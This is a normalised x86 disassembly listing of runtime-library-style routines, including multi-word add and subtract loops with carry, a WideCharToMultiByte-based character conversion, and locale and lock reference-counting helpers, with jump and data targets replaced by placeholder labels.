mov [ esi + 0x8 ] eax
dec ebx
mov [ esi + 0xc ] edx
je r-xdata
mov eax [ edi + 0x8 ]
mul eax
mov [ esi + 0x10 ] eax
dec ebx
mov [ esi + 0x14 ] edx
je r-xdata
mov eax [ edi + 0xc ]
mul eax
mov [ esi + 0x18 ] eax
dec ebx
mov [ esi + 0x1c ] edx
je r-xdata
mov eax [ edi + 0x10 ]
mul eax
mov [ esi + 0x20 ] eax
dec ebx
mov [ esi + 0x24 ] edx
je r-xdata
mov eax [ edi + 0x14 ]
mul eax
mov [ esi + 0x28 ] eax
dec ebx
mov [ esi + 0x2c ] edx
je r-xdata
mov eax [ edi + 0x18 ]
mul eax
mov [ esi + 0x30 ] eax
mov [ esi + 0x34 ] edx
sub_435010
push ebp
push ebx
push esi
push edi
mov ebx [ esp + 0x14 ]
mov esi [ esp + 0x18 ]
mov edi [ esp + 0x1c ]
mov ebp [ esp + 0x20 ]
xor eax eax
and ebp 0xfffffff8
je r-xdata
mov ebp [ esp + 0x20 ]
and ebp 0x7
je r-xdata
mov ecx [ esi ]
mov edx [ edi ]
add ecx eax
mov eax 0x0
adc eax eax
add ecx edx
adc eax 0x0
mov [ ebx ] ecx
mov ecx [ esi + 0x4 ]
mov edx [ edi + 0x4 ]
add ecx eax
mov eax 0x0
adc eax eax
add ecx edx
adc eax 0x0
mov [ ebx + 0x4 ] ecx
mov ecx [ esi + 0x8 ]
mov edx [ edi + 0x8 ]
add ecx eax
mov eax 0x0
adc eax eax
add ecx edx
adc eax 0x0
mov [ ebx + 0x8 ] ecx
mov ecx [ esi + 0xc ]
mov edx [ edi + 0xc ]
add ecx eax
mov eax 0x0
adc eax eax
add ecx edx
adc eax 0x0
mov [ ebx + 0xc ] ecx
mov ecx [ esi + 0x10 ]
mov edx [ edi + 0x10 ]
add ecx eax
mov eax 0x0
adc eax eax
add ecx edx
adc eax 0x0
mov [ ebx + 0x10 ] ecx
mov ecx [ esi + 0x14 ]
mov edx [ edi + 0x14 ]
add ecx eax
mov eax 0x0
adc eax eax
add ecx edx
adc eax 0x0
mov [ ebx + 0x14 ] ecx
mov ecx [ esi + 0x18 ]
mov edx [ edi + 0x18 ]
add ecx eax
mov eax 0x0
adc eax eax
add ecx edx
adc eax 0x0
mov [ ebx + 0x18 ] ecx
mov ecx [ esi + 0x1c ]
mov edx [ edi + 0x1c ]
add ecx eax
mov eax 0x0
adc eax eax
add ecx edx
adc eax 0x0
mov [ ebx + 0x1c ] ecx
add esi 0x20
add edi 0x20
add ebx 0x20
sub ebp 0x8
jne r-xdata
pop edi
pop esi
pop ebx
pop ebp
retn
mov ecx [ esi ]
mov edx [ edi ]
add ecx eax
mov eax 0x0
adc eax eax
add ecx edx
adc eax 0x0
dec ebp
mov [ ebx ] ecx
je r-xdata
mov ecx [ esi + 0x4 ]
mov edx [ edi + 0x4 ]
add ecx eax
mov eax 0x0
adc eax eax
add ecx edx
adc eax 0x0
dec ebp
mov [ ebx + 0x4 ] ecx
je r-xdata
mov ecx [ esi + 0x8 ]
mov edx [ edi + 0x8 ]
add ecx eax
mov eax 0x0
adc eax eax
add ecx edx
adc eax 0x0
dec ebp
mov [ ebx + 0x8 ] ecx
je r-xdata
mov ecx [ esi + 0xc ]
mov edx [ edi + 0xc ]
add ecx eax
mov eax 0x0
adc eax eax
add ecx edx
adc eax 0x0
dec ebp
mov [ ebx + 0xc ] ecx
je r-xdata
mov ecx [ esi + 0x10 ]
mov edx [ edi + 0x10 ]
add ecx eax
mov eax 0x0
adc eax eax
add ecx edx
adc eax 0x0
dec ebp
mov [ ebx + 0x10 ] ecx
je r-xdata
mov ecx [ esi + 0x14 ]
mov edx [ edi + 0x14 ]
add ecx eax
mov eax 0x0
adc eax eax
add ecx edx
adc eax 0x0
dec ebp
mov [ ebx + 0x14 ] ecx
je r-xdata
mov ecx [ esi + 0x18 ]
mov edx [ edi + 0x18 ]
add ecx eax
mov eax 0x0
adc eax eax
add ecx edx
adc eax 0x0
mov [ ebx + 0x18 ] ecx
sub_435200
push ebp
push ebx
push esi
push edi
mov ebx [ esp + 0x14 ]
mov esi [ esp + 0x18 ]
mov edi [ esp + 0x1c ]
mov ebp [ esp + 0x20 ]
xor eax eax
and ebp 0xfffffff8
je r-xdata
mov ebp [ esp + 0x20 ]
and ebp 0x7
je r-xdata
mov ecx [ esi ]
mov edx [ edi ]
sub ecx eax
mov eax 0x0
adc eax eax
sub ecx edx
adc eax 0x0
mov [ ebx ] ecx
mov ecx [ esi + 0x4 ]
mov edx [ edi + 0x4 ]
sub ecx eax
mov eax 0x0
adc eax eax
sub ecx edx
adc eax 0x0
mov [ ebx + 0x4 ] ecx
mov ecx [ esi + 0x8 ]
mov edx [ edi + 0x8 ]
sub ecx eax
mov eax 0x0
adc eax eax
sub ecx edx
adc eax 0x0
mov [ ebx + 0x8 ] ecx
mov ecx [ esi + 0xc ]
mov edx [ edi + 0xc ]
sub ecx eax
mov eax 0x0
adc eax eax
sub ecx edx
adc eax 0x0
mov [ ebx + 0xc ] ecx
mov ecx [ esi + 0x10 ]
mov edx [ edi + 0x10 ]
sub ecx eax
mov eax 0x0
adc eax eax
sub ecx edx
adc eax 0x0
mov [ ebx + 0x10 ] ecx
mov ecx [ esi + 0x14 ]
mov edx [ edi + 0x14 ]
sub ecx eax
mov eax 0x0
adc eax eax
sub ecx edx
adc eax 0x0
mov [ ebx + 0x14 ] ecx
mov ecx [ esi + 0x18 ]
mov edx [ edi + 0x18 ]
sub ecx eax
mov eax 0x0
adc eax eax
sub ecx edx
adc eax 0x0
mov [ ebx + 0x18 ] ecx
mov ecx [ esi + 0x1c ]
mov edx [ edi + 0x1c ]
sub ecx eax
mov eax 0x0
adc eax eax
sub ecx edx
adc eax 0x0
mov [ ebx + 0x1c ] ecx
add esi 0x20
add edi 0x20
add ebx 0x20
sub ebp 0x8
jne r-xdata
pop edi
pop esi
pop ebx
pop ebp
retn
mov ecx [ esi ]
mov edx [ edi ]
sub ecx eax
mov eax 0x0
adc eax eax
sub ecx edx
adc eax 0x0
dec ebp
mov [ ebx ] ecx
je r-xdata
mov ecx [ esi + 0x4 ]
mov edx [ edi + 0x4 ]
sub ecx eax
mov eax 0x0
adc eax eax
sub ecx edx
adc eax 0x0
dec ebp
mov [ ebx + 0x4 ] ecx
je r-xdata
mov ecx [ esi + 0x8 ]
mov edx [ edi + 0x8 ]
sub ecx eax
mov eax 0x0
adc eax eax
sub ecx edx
adc eax 0x0
dec ebp
mov [ ebx + 0x8 ] ecx
je r-xdata
mov ecx [ esi + 0xc ]
mov edx [ edi + 0xc ]
sub ecx eax
mov eax 0x0
adc eax eax
sub ecx edx
adc eax 0x0
dec ebp
mov [ ebx + 0xc ] ecx
je r-xdata
mov ecx [ esi + 0x10 ]
mov edx [ edi + 0x10 ]
sub ecx eax
mov eax 0x0
adc eax eax
sub ecx edx
adc eax 0x0
dec ebp
mov [ ebx + 0x10 ] ecx
je r-xdata
mov ecx [ esi + 0x14 ]
mov edx [ edi + 0x14 ]
sub ecx eax
mov eax 0x0
adc eax eax
sub ecx edx
adc eax 0x0
dec ebp
mov [ ebx + 0x14 ] ecx
je r-xdata
mov ecx [ esi + 0x18 ]
mov edx [ edi + 0x18 ]
sub ecx eax
mov eax 0x0
adc eax eax
sub ecx edx
adc eax 0x0
mov [ ebx + 0x18 ] ecx
sub_4353f0
push ebp
push ebx
push esi
push edi
mov ebx [ esp + 0x14 ]
mov esi [ esp + 0x18 ]
mov edi [ esp + 0x1c ]
mov ebp [ esp + 0x20 ]
xor eax eax
and ebp 0xfffffff8
je r-xdata
mov ebp [ esp + 0x20 ]
and ebp 0x7
je r-xdata
mov ecx [ esi ]
mov edx [ edi ]
sub ecx eax
mov eax 0x0
adc eax eax
sub ecx edx
adc eax 0x0
mov [ ebx ] ecx
mov ecx [ esi + 0x4 ]
mov edx [ edi + 0x4 ]
sub ecx eax
mov eax 0x0
adc eax eax
sub ecx edx
adc eax 0x0
mov [ ebx + 0x4 ] ecx
mov ecx [ esi + 0x8 ]
mov edx [ edi + 0x8 ]
sub ecx eax
mov eax 0x0
adc eax eax
sub ecx edx
adc eax 0x0
mov [ ebx + 0x8 ] ecx
mov ecx [ esi + 0xc ]
mov edx [ edi + 0xc ]
sub ecx eax
mov eax 0x0
adc eax eax
sub ecx edx
adc eax 0x0
mov [ ebx + 0xc ] ecx
mov ecx [ esi + 0x10 ]
mov edx [ edi + 0x10 ]
sub ecx eax
mov eax 0x0
adc eax eax
sub ecx edx
adc eax 0x0
mov [ ebx + 0x10 ] ecx
mov ecx [ esi + 0x14 ]
mov edx [ edi + 0x14 ]
sub ecx eax
mov eax 0x0
adc eax eax
sub ecx edx
adc eax 0x0
mov [ ebx + 0x14 ] ecx
mov ecx [ esi + 0x18 ]
mov edx [ edi + 0x18 ]
sub ecx eax
mov eax 0x0
adc eax eax
sub ecx edx
adc eax 0x0
mov [ ebx + 0x18 ] ecx
mov ecx [ esi + 0x1c ]
mov edx [ edi + 0x1c ]
sub ecx eax
mov eax 0x0
adc eax eax
sub ecx edx
adc eax 0x0
mov [ ebx + 0x1c ] ecx
add esi 0x20
add edi 0x20
add ebx 0x20
sub ebp 0x8
jne r-xdata
cmp [ esp + 0x24 ] 0x0
je r-xdata
mov ecx [ esi ]
mov edx [ edi ]
sub ecx eax
mov eax 0x0
adc eax eax
sub ecx edx
adc eax 0x0
mov [ ebx ] ecx
add esi 0x4
add edi 0x4
add ebx 0x4
dec ebp
je r-xdata
pop edi
pop esi
pop ebx
pop ebp
retn
mov ebp [ esp + 0x24 ]
cmp ebp 0x0
je r-xdata
mov ecx [ esi ]
mov edx [ edi ]
sub ecx eax
mov eax 0x0
adc eax eax
sub ecx edx
adc eax 0x0
mov [ ebx ] ecx
add esi 0x4
add edi 0x4
add ebx 0x4
dec ebp
je r-xdata
jge r-xdata
mov ecx [ esi ]
mov edx [ edi ]
sub ecx eax
mov eax 0x0
adc eax eax
sub ecx edx
adc eax 0x0
mov [ ebx ] ecx
add esi 0x4
add edi 0x4
add ebx 0x4
dec ebp
je r-xdata
and ebp 0xfffffff8
je r-xdata
mov edx 0x0
sub edx ebp
mov ebp edx
and ebp 0xfffffff8
je r-xdata
mov ecx [ esi ]
mov edx [ edi ]
sub ecx eax
mov eax 0x0
adc eax eax
sub ecx edx
adc eax 0x0
mov [ ebx ] ecx
add esi 0x4
add edi 0x4
add ebx 0x4
dec ebp
je r-xdata
mov ebp [ esp + 0x24 ]
and ebp 0x7
je r-xdata
mov ecx [ esi ]
sub ecx eax
mov [ ebx ] ecx
jae r-xdata
mov edx [ esp + 0x24 ]
mov ebp 0x0
sub ebp edx
and ebp 0x7
je r-xdata
mov ecx 0x0
mov edx [ edi ]
sub ecx eax
mov eax 0x0
adc eax eax
sub ecx edx
adc eax 0x0
mov [ ebx ] ecx
mov ecx 0x0
mov edx [ edi + 0x4 ]
sub ecx eax
mov eax 0x0
adc eax eax
sub ecx edx
adc eax 0x0
mov [ ebx + 0x4 ] ecx
mov ecx 0x0
mov edx [ edi + 0x8 ]
sub ecx eax
mov eax 0x0
adc eax eax
sub ecx edx
adc eax 0x0
mov [ ebx + 0x8 ] ecx
mov ecx 0x0
mov edx [ edi + 0xc ]
sub ecx eax
mov eax 0x0
adc eax eax
sub ecx edx
adc eax 0x0
mov [ ebx + 0xc ] ecx
mov ecx 0x0
mov edx [ edi + 0x10 ]
sub ecx eax
mov eax 0x0
adc eax eax
sub ecx edx
adc eax 0x0
mov [ ebx + 0x10 ] ecx
mov ecx 0x0
mov edx [ edi + 0x14 ]
sub ecx eax
mov eax 0x0
adc eax eax
sub ecx edx
adc eax 0x0
mov [ ebx + 0x14 ] ecx
mov ecx 0x0
mov edx [ edi + 0x18 ]
sub ecx eax
mov eax 0x0
adc eax eax
sub ecx edx
adc eax 0x0
mov [ ebx + 0x18 ] ecx
mov ecx 0x0
mov edx [ edi + 0x1c ]
sub ecx eax
mov eax 0x0
adc eax eax
sub ecx edx
adc eax 0x0
mov [ ebx + 0x1c ] ecx
add edi 0x20
add ebx 0x20
sub ebp 0x8
jne r-xdata
mov ecx [ esi ]
mov edx [ edi ]
sub ecx eax
mov eax 0x0
adc eax eax
sub ecx edx
adc eax 0x0
mov [ ebx ] ecx
add esi 0x4
add edi 0x4
add ebx 0x4
dec ebp
je r-xdata
mov ecx [ esi ]
sub ecx eax
mov [ ebx ] ecx
jae r-xdata
mov ecx [ esi + 0x4 ]
mov [ ebx + 0x4 ] ecx
mov ecx [ esi + 0x4 ]
sub ecx eax
mov [ ebx + 0x4 ] ecx
jae r-xdata
mov ecx 0x0
mov edx [ edi ]
sub ecx eax
mov eax 0x0
adc eax eax
sub ecx edx
adc eax 0x0
dec ebp
mov [ ebx ] ecx
je r-xdata
mov ecx [ esi ]
mov edx [ edi ]
sub ecx eax
mov eax 0x0
adc eax eax
sub ecx edx
adc eax 0x0
mov [ ebx ] ecx
add esi 0x4
add edi 0x4
add ebx 0x4
dec ebp
je r-xdata
dec ebp
je r-xdata
dec ebp
je r-xdata
mov ecx [ esi ]
mov [ ebx ] ecx
mov ebp [ esp + 0x24 ]
and ebp 0x7
je r-xdata
mov ecx [ esi + 0x8 ]
mov [ ebx + 0x8 ] ecx
mov ecx [ esi + 0x8 ]
sub ecx eax
mov [ ebx + 0x8 ] ecx
jae r-xdata
mov ecx 0x0
mov edx [ edi + 0x4 ]
sub ecx eax
mov eax 0x0
adc eax eax
sub ecx edx
adc eax 0x0
dec ebp
mov [ ebx + 0x4 ] ecx
je r-xdata
mov ecx [ esi ]
mov edx [ edi ]
sub ecx eax
mov eax 0x0
adc eax eax
sub ecx edx
adc eax 0x0
mov [ ebx ] ecx
add esi 0x4
add edi 0x4
add ebx 0x4
mov eax 0x0
mov ecx [ esi + 0x4 ]
mov [ ebx + 0x4 ] ecx
mov ecx [ esi + 0x4 ]
sub ecx eax
mov [ ebx + 0x4 ] ecx
jae r-xdata
mov ecx [ esi ]
mov [ ebx ] ecx
mov ecx [ esi + 0xc ]
mov [ ebx + 0xc ] ecx
mov ecx [ esi + 0xc ]
sub ecx eax
mov [ ebx + 0xc ] ecx
jae r-xdata
mov ecx 0x0
mov edx [ edi + 0x8 ]
sub ecx eax
mov eax 0x0
adc eax eax
sub ecx edx
adc eax 0x0
dec ebp
mov [ ebx + 0x8 ] ecx
je r-xdata
mov ecx [ esi + 0x8 ]
mov [ ebx + 0x8 ] ecx
dec ebp
je r-xdata
dec ebp
je r-xdata
mov ecx [ esi + 0x10 ]
mov [ ebx + 0x10 ] ecx
mov ecx [ esi + 0x10 ]
sub ecx eax
mov [ ebx + 0x10 ] ecx
jae r-xdata
mov ecx 0x0
mov edx [ edi + 0xc ]
sub ecx eax
mov eax 0x0
adc eax eax
sub ecx edx
adc eax 0x0
dec ebp
mov [ ebx + 0xc ] ecx
je r-xdata
mov ecx [ esi + 0xc ]
mov [ ebx + 0xc ] ecx
mov ecx [ esi + 0x8 ]
sub ecx eax
mov [ ebx + 0x8 ] ecx
jae r-xdata
mov ecx [ esi + 0x14 ]
mov [ ebx + 0x14 ] ecx
mov ecx [ esi + 0x14 ]
sub ecx eax
mov [ ebx + 0x14 ] ecx
jae r-xdata
mov ecx 0x0
mov edx [ edi + 0x10 ]
sub ecx eax
mov eax 0x0
adc eax eax
sub ecx edx
adc eax 0x0
dec ebp
mov [ ebx + 0x10 ] ecx
je r-xdata
mov ecx [ esi + 0x10 ]
mov [ ebx + 0x10 ] ecx
dec ebp
je r-xdata
dec ebp
je r-xdata
mov ecx [ esi + 0x18 ]
mov [ ebx + 0x18 ] ecx
mov ecx [ esi + 0x18 ]
sub ecx eax
mov [ ebx + 0x18 ] ecx
jae r-xdata
mov ecx 0x0
mov edx [ edi + 0x14 ]
sub ecx eax
mov eax 0x0
adc eax eax
sub ecx edx
adc eax 0x0
dec ebp
mov [ ebx + 0x14 ] ecx
je r-xdata
mov ecx [ esi + 0x14 ]
mov [ ebx + 0x14 ] ecx
mov ecx [ esi + 0xc ]
sub ecx eax
mov [ ebx + 0xc ] ecx
jae r-xdata
mov ecx [ esi + 0x1c ]
mov [ ebx + 0x1c ] ecx
mov ecx [ esi + 0x1c ]
sub ecx eax
mov [ ebx + 0x1c ] ecx
jae r-xdata
mov ecx 0x0
mov edx [ edi + 0x18 ]
sub ecx eax
mov eax 0x0
adc eax eax
sub ecx edx
adc eax 0x0
mov [ ebx + 0x18 ] ecx
jmp r-xdata
mov ecx [ esi + 0x18 ]
mov [ ebx + 0x18 ] ecx
dec ebp
je r-xdata
dec ebp
je r-xdata
add esi 0x20
add ebx 0x20
sub ebp 0x8
jne r-xdata
add esi 0x20
add ebx 0x20
sub ebp 0x8
jne r-xdata
mov ecx [ esi + 0x10 ]
sub ecx eax
mov [ ebx + 0x10 ] ecx
jae r-xdata
dec ebp
je r-xdata
dec ebp
je r-xdata
mov ecx [ esi + 0x14 ]
sub ecx eax
mov [ ebx + 0x14 ] ecx
jae r-xdata
dec ebp
je r-xdata
dec ebp
je r-xdata
mov ecx [ esi + 0x18 ]
sub ecx eax
mov [ ebx + 0x18 ] ecx
jae r-xdata
mov eax 0x1
jmp r-xdata
sub_435a79
mov edi edi
push ebp
mov ebp esp
sub esp 0xc
mov eax [ ebp + 0x8 ]
mov [ ebp + 0x8 ] eax
lea eax [ ebp + 0x8 ]
push eax
lea ecx [ ebp - 0xc ]
call sub_437cb3
push r--data
lea eax [ ebp - 0xc ]
push eax
mov [ ebp - 0xc ] r--data
call sub_43c3a5
int3
sub_435ac6
mov edi edi
push ebp
mov ebp esp
sub esp 0xc
mov eax [ ebp + 0x8 ]
mov [ ebp + 0x8 ] eax
lea eax [ ebp + 0x8 ]
push eax
lea ecx [ ebp - 0xc ]
call sub_437cb3
push r--data
lea eax [ ebp - 0xc ]
push eax
mov [ ebp - 0xc ] r--data
call sub_43c3a5
int3
sub_435b13
mov edi edi
push ebp
mov ebp esp
push esi
mov esi ecx
call sub_437d2d
test [ ebp + 0x8 ] 0x1
je r-xdata
mov eax esi
pop esi
pop ebp
retn 0x4
push esi
call sub_43811c
pop ecx
sub_435b3f
mov edi edi
push ebp
mov ebp esp
mov eax [ ebp + 0x14 ]
push esi
push edi
test eax eax
jne r-xdata
mov esi [ eax ]
mov edi [ eax + 0x4 ]
call sub_43c803
mov esi [ eax + 0x8 ]
call sub_43c7dd
mov edi eax
jmp r-xdata
and [ ebp + 0x14 ] 0x0
push edi
call sub_43631f
pop ecx
lea ecx [ ebp + 0x14 ]
push ecx
push 0x0
push eax
call sub_43c7c1
pop ecx
push eax
push [ ebp + 0x8 ]
lea eax [ ebp + 0xc ]
push 0x1
push eax
push 0x0
push edi
call [ WideCharToMultiByte@IAT ]
test eax eax
je r-xdata
mov ax [ ebp + 0xc ]
mov ecx 0xff
cmp ax cx
ja r-xdata
test esi esi
jne r-xdata
call sub_43c04c
mov [ eax ] 0x2a
or eax 0xffffffff
cmp [ ebp + 0x14 ] 0x0
je r-xdata
mov ecx [ ebp + 0x8 ]
mov [ ecx ] al
xor eax eax
inc eax
jmp r-xdata
pop edi
pop esi
pop ebp
retn
sub_435bdc
mov edi edi
push ebp
mov ebp esp
test [ ebp + 0x8 ] 0x1
push esi
mov esi ecx
mov [ esi ] r--data
je r-xdata
mov eax esi
pop esi
pop ebp
retn 0x4
push esi
call sub_43811c
pop ecx
sub_435bfe
mov edi edi
push ebp
mov ebp esp
mov edx [ ecx + 0x4 ]
mov eax [ ebp + 0x8 ]
cmp edx [ eax + 0x4 ]
jne r-xdata
xor eax eax
mov ecx [ ecx ]
cmp ecx [ eax ]
jne r-xdata
xor eax eax
inc eax
jmp r-xdata
pop ebp
retn 0x4
sub_435c1f
mov edi edi
push ebp
mov ebp esp
push ecx
push ecx
push [ ebp + 0xc ]
mov eax [ ecx ]
push [ ebp + 0x8 ]
lea edx [ ebp - 0x8 ]
push edx
call [ eax + 0xc ]
mov ecx eax
call sub_435bfe
leave
retn 0x8
sub_435c40
mov edi edi
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
cmp ecx [ eax + 0x4 ]
jne r-xdata
xor eax eax
mov eax [ eax ]
cmp eax [ ebp + 0xc ]
jne r-xdata
xor eax eax
inc eax
jmp r-xdata
pop ebp
retn 0x8
sub_435c81
mov edi edi
push ebp
mov ebp esp
push ecx
push [ ebp + 0xc ]
and [ ebp - 0x4 ] 0x0
call sub_43c1ec
pop ecx
mov ecx [ ebp + 0x8 ]
push eax
call sub_408110
mov eax [ ebp + 0x8 ]
leave
retn 0x8
sub_435ca4
mov edi edi
push ebp
mov ebp esp
push ecx
and [ ebp - 0x4 ] 0x0
cmp [ ebp + 0xc ] 0x1
jne r-xdata
push [ ebp + 0xc ]
call sub_43c1ec
pop ecx
push eax
push r--data
jmp r-xdata
mov ecx [ ebp + 0x8 ]
call sub_408110
mov eax [ ebp + 0x8 ]
leave
retn 0x8
sub_435cd4
mov edi edi
push ebp
mov ebp esp
push esi
push edi
mov edi ecx
mov esi [ edi + 0x2c ]
jmp r-xdata
test esi esi
jne r-xdata
push [ esi + 0x4 ]
push edi
push [ ebp + 0x8 ]
call [ esi + 0x8 ]
mov esi [ esi ]
add esp 0xc
pop edi
pop esi
pop ebp
retn 0x4
sub_435cfb
mov edi edi
push esi
push edi
push 0x0
mov esi ecx
call sub_435cd4
mov eax [ esi + 0x28 ]
test eax eax
je r-xdata
mov eax [ esi + 0x2c ]
and [ esi + 0x28 ] 0x0
test eax eax
je r-xdata
mov edi [ eax ]
push eax
call sub_43811c
pop ecx
mov eax edi
test edi edi
jne r-xdata
and [ esi + 0x2c ] 0x0
pop edi
pop esi
retn
mov edi [ eax ]
push eax
call sub_43811c
pop ecx
mov eax edi
test edi edi
jne r-xdata
sub_435d3f
mov edi edi
push ebp
mov ebp esp
push ecx
push 0x2
lea ecx [ ebp - 0x4 ]
call sub_436188
mov eax [ ebp + 0x8 ]
mov [ eax + 0x8 ] 0x1
mov ecx [ eax + 0x8 ]
mov [ ecx * 4 + rw-data ] eax
mov eax [ eax + 0x8 ]
inc [ eax + rw-data ]
lea ecx [ ebp - 0x4 ]
call sub_4361b0
leave
retn
cmp ecx eax
je r-xdata
mov ecx [ eax + 0x8 ]
inc ecx
mov [ eax + 0x8 ] ecx
cmp ecx 0x8
jb r-xdata
mov ecx [ eax + 0x8 ]
mov ecx [ ecx * 4 + rw-data ]
test ecx ecx
je r-xdata
sub_435d94
mov edi edi
push ebp
mov ebp esp
push esi
mov esi [ ebp + 0x8 ]
cmp [ esi + 0x8 ] 0x0
jbe r-xdata
mov ecx esi
call sub_435cfb
mov esi [ esi + 0x30 ]
test esi esi
je r-xdata
mov eax [ esi + 0x8 ]
lea eax [ eax + rw-data ]
dec [ eax ]
cmp [ eax ] 0x0
jg r-xdata
pop esi
pop ebp
retn
mov ecx esi
call sub_402840
push esi
call sub_43811c
pop ecx
sub_435de7
mov edi edi
push ebp
mov ebp esp
push 0x8
call sub_438178
pop ecx
test eax eax
je r-xdata
xor eax eax
mov ecx [ rw-data ]
mov [ eax ] ecx
mov ecx [ ebp + 0x8 ]
mov [ eax + 0x4 ] ecx
jmp r-xdata
mov [ rw-data ] eax
pop ebp
retn
sub_435e11
mov edi edi
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
mov ecx [ eax ]
test ecx ecx
je r-xdata
pop ebp
retn
call sub_4027f0
test eax eax
je r-xdata
mov edx [ eax ]
push 0x1
mov ecx eax
call [ edx ]
sub_435e32
mov edi edi
push ebp
mov ebp esp
push ecx
push 0x0
lea ecx [ ebp - 0x4 ]
call sub_436188
push rw-data
call sub_435e11
and [ rw-data ] 0x0
pop ecx
lea ecx [ ebp - 0x4 ]
call sub_4361b0
leave
retn
sub_435e64
mov edi edi
push ebp
mov ebp esp
cmp [ rw-data ] 0x0
jne r-xdata
mov eax [ ebp + 0x8 ]
mov [ rw-data ] eax
pop ebp
retn
push sub_435e32
mov [ rw-data ] 0x1
call sub_437b7f
pop ecx
sub_435e8e
push 0x4
mov eax sub_450ec8
call sub_43cccf
push 0x0
lea ecx [ ebp - 0x10 ]
call sub_436188
mov edi [ ebp + 0x8 ]
and [ ebp - 0x4 ] 0x0
mov esi [ edi + 0xc ]
jmp r-xdata
test esi esi
jne r-xdata
mov eax [ edi + 0x8 ]
dec esi
lea eax [ eax + esi * 4 ]
cmp [ eax ] 0x0
je r-xdata
push [ edi + 0x8 ]
call sub_4381f8
or [ ebp - 0x4 ] 0xffffffff
pop ecx
lea ecx [ ebp - 0x10 ]
call sub_4361b0
call sub_43cd6e
retn
mov ecx [ eax ]
call sub_4027f0
test eax eax
je r-xdata
mov edx [ eax ]
push 0x1
mov ecx eax
call [ edx ]
sub_435eee
push 0x4
mov eax sub_450ec8
call sub_43cccf
push 0x0
lea ecx [ ebp - 0x10 ]
call sub_436188
and [ ebp - 0x4 ] 0x0
jmp r-xdata
mov eax [ rw-data ]
test eax eax
jne r-xdata
mov esi eax
mov eax [ eax ]
mov ecx esi
mov [ rw-data ] eax
call sub_435dd2
push esi
call sub_43811c
pop ecx
or [ ebp - 0x4 ] 0xffffffff
lea ecx [ ebp - 0x10 ]
call sub_4361b0
call sub_43cd6e
retn
sub_435f3c
mov edi edi
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
mov eax [ eax + 0x14 ]
test eax eax
je r-xdata
pop ebp
retn
push eax
push 0x0
call sub_439ffd
pop ecx
pop ecx
sub_435f57
mov edi edi
push ebp
mov ebp esp
push esi
mov esi ecx
mov eax [ esi ]
push edi
mov edi [ ebp + 0x8 ]
cmp eax edi
je r-xdata
pop edi
mov eax esi
pop esi
pop ebp
retn 0x4
test eax eax
je r-xdata
and [ esi ] 0x0
test edi edi
je r-xdata
push eax
call sub_4381f8
pop ecx
cmp [ edi ] 0x0
mov eax edi
je r-xdata
sub eax edi
push ebx
lea ebx [ eax + 0x1 ]
push ebx
call sub_438337
pop ecx
mov [ esi ] eax
test eax eax
je r-xdata
inc eax
cmp [ eax ] 0x0
jne r-xdata
pop ebx
push ebx
push edi
push eax
call sub_43a8a0
add esp 0xc
sub_435faf
mov edi edi
push ebp
mov ebp esp
push 0x0
push 0x0
call sub_439ffd
pop ecx
pop ecx
test eax eax
jne r-xdata
push esi
mov esi [ ebp + 0x8 ]
push eax
lea ecx [ esi + 0x14 ]
call sub_435f57
cmp [ ebp + 0xc ] 0x0
je r-xdata
mov eax r--data
mov eax r--data
push [ ebp + 0xc ]
push 0x0
call sub_439ffd
pop ecx
pop ecx
test eax eax
jne r-xdata
push eax
lea ecx [ esi + 0x1c ]
call sub_435f57
pop esi
pop ebp
retn
sub_435ffc
mov edi edi
push ebp
mov ebp esp
push esi
mov esi ecx
mov cl [ ebp + 0x8 ]
xor eax eax
mov [ esi + 0x14 ] cl
lea ecx [ esi + 0x18 ]
mov [ esi + 0x4 ] 0x1
mov [ esi ] r--data
mov [ esi + 0x8 ] eax
mov [ esi + 0xc ] eax
mov [ esi + 0x10 ] eax
push r--data
mov [ ecx ] eax
mov [ ecx + 0x4 ] al
call sub_435f57
mov eax esi
pop esi
pop ebp
retn 0x4
sub_43603b
push 0x4
mov eax sub_450ef6
call sub_43cccf
mov esi ecx
mov [ ebp - 0x10 ] esi
mov [ esi ] r--data
push esi
mov [ ebp - 0x4 ] 0x1
call sub_435e8e
mov eax [ esi + 0x18 ]
pop ecx
test eax eax
je r-xdata
and [ esi + 0x18 ] 0x0
mov [ esi ] r--data
call sub_43cd6e
retn
push eax
call sub_4381f8
pop ecx
sub_43607e
mov edi edi
push ebp
mov ebp esp
push esi
mov esi ecx
call sub_43603b
test [ ebp + 0x8 ] 0x1
je r-xdata
mov eax esi
pop esi
pop ebp
retn 0x4
push esi
call sub_43811c
pop ecx
sub_43609f
push 0x4
mov eax sub_450ec8
call sub_43cccf
mov eax [ rw-data ]
xor esi esi
mov edi eax
cmp eax esi
jne r-xdata
mov eax edi
call sub_43cd6e
retn
push esi
lea ecx [ ebp - 0x10 ]
call sub_436188
mov eax [ rw-data ]
mov [ ebp - 0x4 ] esi
mov edi eax
cmp eax esi
jne r-xdata
or [ ebp - 0x4 ] 0xffffffff
lea ecx [ ebp - 0x10 ]
call sub_4361b0
push 0x20
call sub_438178
pop ecx
cmp eax esi
je r-xdata
push esi
mov edi esi
call sub_435e64
lea ecx [ esi + 0x18 ]
mov [ esi + 0x10 ] 0x3f
mov [ esp ] r--data
call sub_435f57
mov ecx esi
mov [ rw-data ] esi
call sub_4027c0
mov eax [ rw-data ]
mov [ rw-data ] eax
push esi
mov ecx eax
call sub_435ffc
mov esi eax
sub_43612e
mov edi edi
push edi
push rw-data
mov edi ecx
call [ InterlockedIncrement@IAT ]
test eax eax
jne r-xdata
mov eax edi
pop edi
retn
push esi
mov esi rw-data
push esi
call sub_437bdc
add esi 0x18
pop ecx
cmp esi rw-data
jl r-xdata
pop esi
sub_43615f
push rw-data
call [ InterlockedDecrement@IAT ]
test eax eax
jns r-xdata
retn
push esi
mov esi rw-data
push esi
call sub_437bec
add esi 0x18
pop ecx
cmp esi rw-data
jl r-xdata
pop esi
sub_436188
mov edi edi
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
push esi
mov esi ecx
mov [ esi ] eax
cmp eax 0x4
jge r-xdata
mov eax esi
pop esi
pop ebp
retn 0x4
imul eax eax 0x18
add eax rw-data
push eax
call sub_437bfc
pop ecx
sub_4361c7
mov edi edi
push esi
push 0x18
mov esi ecx
call sub_438178
push eax
mov [ esi ] eax
call sub_437bdc
pop ecx
pop ecx
mov eax esi
pop esi
retn
sub_43620f
mov edi edi
push ebp
mov ebp esp
push ecx
mov cx [ ebp + 0x8 ]
movzx eax cx
